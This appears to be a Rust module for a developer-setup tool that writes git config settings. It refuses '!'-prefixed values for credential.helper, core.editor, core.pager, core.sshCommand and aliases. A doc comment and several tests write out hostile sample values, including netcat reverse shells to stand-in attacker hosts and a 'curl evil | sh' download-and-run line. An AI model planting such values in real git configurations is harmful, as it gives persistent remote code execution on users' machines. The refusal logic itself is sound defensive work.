//! Git configuration setup - applies git config settings

use std::path::{Path, PathBuf};
use std::process::Command;

use thiserror::Error;

use super::config::{ConfigScope, GitConfig, SigningFormat};

/// Errors that can occur during git configuration
#[derive(Debug, Error)]
pub enum GitError {
    #[error("Failed to set git config '{0}': {1}")]
    ConfigFailed(String, String),

    #[error("Git command failed: {0}")]
    CommandFailed(#[from] std::io::Error),

    #[error("Git not installed")]
    GitNotInstalled,

    #[error("Signing key not found: {0}")]
    #[allow(dead_code)] // Reserved for future validation
    SigningKeyNotFound(String),

    /// A `[git]` config value was refused because git would interpret it as a
    /// shell command. The classic exploit:
    ///
    ///   [git]
    ///   credential_helper = "!nc attacker.tld 4444 -e /bin/sh"
    ///
    /// Git's `!`-prefix syntax executes the value as a shell command on every
    /// `git push` / `git commit`, persisting RCE outside Jarvy's control window.
    /// We refuse `!`-prefixed values for the security-sensitive keys
    /// (`credential.helper`, `core.editor`, `core.pager`, `core.sshCommand`)
    /// and for any `alias.*` unless `JARVY_ALLOW_SHELL_ALIASES=1` is set.
    #[error("Refused dangerous git config '{0}': {1}")]
    RefusedDangerousConfig(String, String),
}

/// Git config keys whose values git interprets as shell commands when the
/// value begins with `!`. A malicious `jarvy.toml` can use any of these to
/// stage persistent RCE on every `git push` / `git commit`.
const GIT_SHELL_INTERPRETED_KEYS: &[&str] = &[
    "credential.helper",
    "core.editor",
    "core.pager",
    "core.sshCommand",
    // sequence.editor, mergetool/difftool also accept ! values; keep narrow
    // for now and grow if a real user pattern needs it.
];

/// Returns true if the given value would be executed as a shell command by
/// git when stored under one of the shell-interpreted config keys.
fn value_is_shell_escape(value: &str) -> bool {
    // Git treats values starting with `!` as shell. Leading whitespace is
    // not stripped by git, so `" !cmd"` is NOT a shell value — but the
    // attacker has no reason to add leading whitespace, so reject the
    // common form.
    value.starts_with('!')
}

/// Git setup handler
pub struct GitSetup {
    config: GitConfig,
    project_dir: Option<PathBuf>,
    quiet: bool,
}

impl GitSetup {
    /// Create a new GitSetup with the given configuration
    pub fn new(config: GitConfig) -> Self {
        Self {
            config,
            project_dir: None,
            quiet: false,
        }
    }

    /// Set the project directory for local scope configurations
    #[allow(dead_code)] // Builder pattern for advanced usage
    pub fn with_project_dir(mut self, dir: PathBuf) -> Self {
        self.project_dir = Some(dir);
        self
    }

    /// Set quiet mode (suppress output)
    #[allow(dead_code)] // Builder pattern for quiet mode
    pub fn quiet(mut self, quiet: bool) -> Self {
        self.quiet = quiet;
        self
    }

    /// Check if git is installed
    pub fn check_git_installed() -> Result<(), GitError> {
        let output = Command::new("git").arg("--version").output()?;

        if !output.status.success() {
            return Err(GitError::GitNotInstalled);
        }
        Ok(())
    }

    /// Apply all git configuration settings
    pub fn configure(&self) -> Result<(), GitError> {
        Self::check_git_installed()?;

        // Configure identity
        self.configure_identity()?;

        // Configure signing if enabled
        if self.config.signing {
            self.configure_signing()?;
        }

        // Configure defaults
        self.configure_defaults()?;

        // Configure editor
        if let Some(ref editor) = self.config.editor {
            self.set_config("core.editor", editor)?;
        }

        // Configure line endings
        self.configure_line_endings()?;

        // Configure credential helper
        self.configure_credential_helper()?;

        // Configure aliases
        self.configure_aliases()?;

        Ok(())
    }

    /// Configure user identity (name and email)
    fn configure_identity(&self) -> Result<(), GitError> {
        if let Some(ref name) = self.config.user_name {
            if let Some(value) = name.resolve() {
                self.set_config("user.name", &value)?;
            }
        }

        if let Some(ref email) = self.config.user_email {
            if let Some(value) = email.resolve() {
                self.set_config("user.email", &value)?;
            }
        }

        Ok(())
    }

    /// Configure commit signing
    fn configure_signing(&self) -> Result<(), GitError> {
        self.set_config("commit.gpgsign", "true")?;

        if let Some(ref key) = self.config.signing_key {
            // Expand tilde in path
            let key_path = shellexpand::tilde(key);

            // Auto-detect format if not specified
            let format = self.config.signing_format.unwrap_or_else(|| {
                if key_path.ends_with(".pub") {
                    SigningFormat::Ssh
                } else {
                    SigningFormat::Gpg
                }
            });

            match format {
                SigningFormat::Ssh => {
                    self.set_config("gpg.format", "ssh")?;
                    self.set_config("user.signingkey", &key_path)?;
                }
                SigningFormat::Gpg => {
                    self.set_config("user.signingkey", &key_path)?;
                }
            }
        }

        Ok(())
    }

    /// Configure default settings (branch, pull strategy, etc.)
    fn configure_defaults(&self) -> Result<(), GitError> {
        if let Some(ref branch) = self.config.default_branch {
            self.set_config("init.defaultBranch", branch)?;
        }

        if self.config.pull_rebase {
            self.set_config("pull.rebase", "true")?;
        }

        if self.config.auto_stash {
            self.set_config("rebase.autoStash", "true")?;
        }

        if self.config.push_autosetup {
            self.set_config("push.autoSetupRemote", "true")?;
        }

        Ok(())
    }

    /// Configure line ending settings
    fn configure_line_endings(&self) -> Result<(), GitError> {
        if let Some(ref autocrlf) = self.config.autocrlf {
            self.set_config("core.autocrlf", autocrlf.as_str())?;
        }

        if let Some(ref eol) = self.config.eol {
            self.set_config("core.eol", eol)?;
        }

        Ok(())
    }

    /// Configure credential helper (auto-detect based on OS if not specified)
    fn configure_credential_helper(&self) -> Result<(), GitError> {
        let helper = self
            .config
            .credential_helper
            .as_deref()
            .unwrap_or_else(|| Self::default_credential_helper());

        self.set_config("credential.helper", helper)?;
        Ok(())
    }

    /// Configure git aliases
    fn configure_aliases(&self) -> Result<(), GitError> {
        for (alias, command) in &self.config.aliases {
            self.set_config(&format!("alias.{alias}"), command)?;
        }
        Ok(())
    }

    /// Set a single git config value
    fn set_config(&self, key: &str, value: &str) -> Result<(), GitError> {
        // Refuse `!`-prefixed values for keys git interprets as shell.
        // See `RefusedDangerousConfig` for the threat model.
        if value_is_shell_escape(value) {
            let is_alias = key.starts_with("alias.");
            let is_shell_key = GIT_SHELL_INTERPRETED_KEYS.contains(&key);
            if is_shell_key {
                tracing::warn!(
                    event = "git.config.refused_shell_escape",
                    key = %key,
                    "refused git config value starting with `!` for shell-interpreted key"
                );
                return Err(GitError::RefusedDangerousConfig(
                    key.to_string(),
                    "values starting with `!` are interpreted by git as a shell command; \
                     refusing to set this from jarvy.toml"
                        .to_string(),
                ));
            }
            if is_alias {
                let allow = std::env::var("JARVY_ALLOW_SHELL_ALIASES")
                    .map(|v| {
                        v == "1" || v.eq_ignore_ascii_case("true") || v.eq_ignore_ascii_case("yes")
                    })
                    .unwrap_or(false);
                if !allow {
                    tracing::warn!(
                        event = "git.config.refused_shell_alias",
                        alias = %key,
                        "refused git alias starting with `!` (set JARVY_ALLOW_SHELL_ALIASES=1 to allow)"
                    );
                    return Err(GitError::RefusedDangerousConfig(
                        key.to_string(),
                        "git aliases starting with `!` execute as shell on `git <alias>`; \
                         set JARVY_ALLOW_SHELL_ALIASES=1 to allow"
                            .to_string(),
                    ));
                }
            }
        }

        let scope_flag = match self.config.scope {
            ConfigScope::Global => "--global",
            ConfigScope::Local => "--local",
        };

        let mut cmd = Command::new("git");
        cmd.args(["config", scope_flag, key, value]);

        if let Some(ref dir) = self.project_dir {
            cmd.current_dir(dir);
        }

        let output = cmd.output()?;

        if !output.status.success() {
            let stderr = String::from_utf8_lossy(&output.stderr);
            return Err(GitError::ConfigFailed(key.to_string(), stderr.to_string()));
        }

        if !self.quiet {
            println!("  Set git config {key}: {value}");
        }

        Ok(())
    }

    /// Get the default credential helper for the current OS
    fn default_credential_helper() -> &'static str {
        #[cfg(target_os = "macos")]
        {
            "osxkeychain"
        }

        #[cfg(target_os = "linux")]
        {
            "cache"
        }

        #[cfg(target_os = "windows")]
        {
            "manager-core"
        }

        #[cfg(not(any(target_os = "macos", target_os = "linux", target_os = "windows")))]
        {
            "cache"
        }
    }
}

/// Get a current git config value
#[allow(dead_code)] // Public API for config inspection
pub fn get_git_config(key: &str, scope: ConfigScope) -> Option<String> {
    let scope_flag = match scope {
        ConfigScope::Global => "--global",
        ConfigScope::Local => "--local",
    };

    let output = Command::new("git")
        .args(["config", scope_flag, "--get", key])
        .output()
        .ok()?;

    if output.status.success() {
        Some(String::from_utf8_lossy(&output.stdout).trim().to_string())
    } else {
        None
    }
}

/// Check if a signing key file exists
#[allow(dead_code)] // Public API for key validation
pub fn signing_key_exists(key_path: &str) -> bool {
    let expanded = shellexpand::tilde(key_path);
    Path::new(expanded.as_ref()).exists()
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::git::config::AutoCrlf;

    #[test]
    fn test_default_credential_helper() {
        let helper = GitSetup::default_credential_helper();
        // Should return a valid helper name
        assert!(!helper.is_empty());
    }

    #[test]
    fn test_git_setup_builder() {
        let config = GitConfig::default();
        let setup = GitSetup::new(config.clone())
            .with_project_dir(PathBuf::from("/tmp/test"))
            .quiet(true);

        assert!(setup.quiet);
        assert_eq!(setup.project_dir, Some(PathBuf::from("/tmp/test")));
    }

    #[test]
    fn test_autocrlf_as_str() {
        assert_eq!(AutoCrlf::True.as_str(), "true");
        assert_eq!(AutoCrlf::False.as_str(), "false");
        assert_eq!(AutoCrlf::Input.as_str(), "input");
    }

    #[test]
    fn value_is_shell_escape_detects_bang_prefix() {
        assert!(value_is_shell_escape("!nc attacker 4444 -e /bin/sh"));
        assert!(value_is_shell_escape("!"));
        assert!(!value_is_shell_escape("/usr/bin/vim"));
        assert!(!value_is_shell_escape("osxkeychain"));
        assert!(!value_is_shell_escape("checkout"));
    }

    #[test]
    fn set_config_refuses_bang_credential_helper() {
        // Build a setup that won't actually invoke git (we hit the refusal
        // before the Command::output call).
        let cfg = GitConfig::default();
        let setup = GitSetup::new(cfg);
        let err = setup
            .set_config("credential.helper", "!nc evil 4444 -e /bin/sh")
            .unwrap_err();
        match err {
            GitError::RefusedDangerousConfig(k, _) => assert_eq!(k, "credential.helper"),
            other => panic!("expected RefusedDangerousConfig, got {other:?}"),
        }
    }

    #[test]
    fn set_config_refuses_bang_core_editor() {
        let setup = GitSetup::new(GitConfig::default());
        assert!(matches!(
            setup.set_config("core.editor", "!/tmp/payload.sh"),
            Err(GitError::RefusedDangerousConfig(_, _))
        ));
    }

    #[test]
    fn set_config_refuses_bang_alias_without_env_opt_in() {
        // Ensure env not set; this test is racy with parallel tests setting
        // the same var, so we just refuse to assert if it happens to be set.
        if std::env::var("JARVY_ALLOW_SHELL_ALIASES").is_ok() {
            return;
        }
        let setup = GitSetup::new(GitConfig::default());
        assert!(matches!(
            setup.set_config("alias.x", "!curl evil | sh"),
            Err(GitError::RefusedDangerousConfig(_, _))
        ));
    }
}
